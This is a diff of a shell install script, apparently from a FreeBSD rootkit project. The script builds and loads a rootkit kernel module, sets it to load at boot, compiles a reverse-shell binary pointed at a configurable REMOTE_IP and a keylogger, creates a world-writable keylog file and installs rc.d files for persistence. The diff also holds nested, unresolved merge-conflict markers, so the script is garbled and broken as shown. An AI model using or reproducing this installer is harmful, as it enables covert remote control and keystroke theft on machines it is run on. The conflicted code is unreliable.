@@ -49,20 +49,34 @@ cat << "EOF"
 EOF
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 cd $KMOD
+=======
+# cd $KMOD
+>>>>>>> right install file
 
-echo ">> Clean existing build."
-make clean
+# echo ">> Clean existing build."
+# make clean
 
-echo ">> Build rootkit."
-make
+# echo ">> Build rootkit."
+# make
 
+<<<<<<< HEAD
 echo ">> Install rootkit kernel module."
 mv $KMOD/$KO $INSTALL/$KO
 kldload $INSTALL/$KO
 echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
 >>>>>>> install file fix
+=======
+# echo ">> Install rootkit kernel module."
+
+# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+# touch $LOADER_CONF_TRANSPARENT
+
+# mv $KMOD/$KO $INSTALL/$KO
+# kldload $INSTALL/$KO
+>>>>>>> right install file
 
 cd $BINARIES
 
@@ -74,10 +88,13 @@ make rshell_target
 
 echo ">> Compile keylog binary."
 make keylog_target
+<<<<<<< HEAD
 
 echo ">> Creating keylog file."
 touch $KEYLOG_LOG_FILE
 chmod 666 $KEYLOG_LOG_FILE
+=======
+>>>>>>> right install file
 
 echo ">> Editing rshell conf file to contain REMOTE_IP=${REMOTE_IP}."
 sed -i '' "s|${USR_SBIN}${RSHELL}|${USR_SBIN}${RSHELL} ${REMOTE_IP}|g" $BINARIES/$RSHELL_CONF_FILE
@@ -103,7 +120,6 @@ mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
 echo ">> Move keylog configuration file into /etc/rc.d."
 mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
 
-
 # cd $KMOD
 
 # echo ">> Clean existing build."
@@ -119,7 +135,6 @@ mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
 
 # mv $KMOD/$KO $INSTALL/$KO
 # kldload $INSTALL/$KO
-
 
 if [ "$2" = "DEBUG" ]
 then
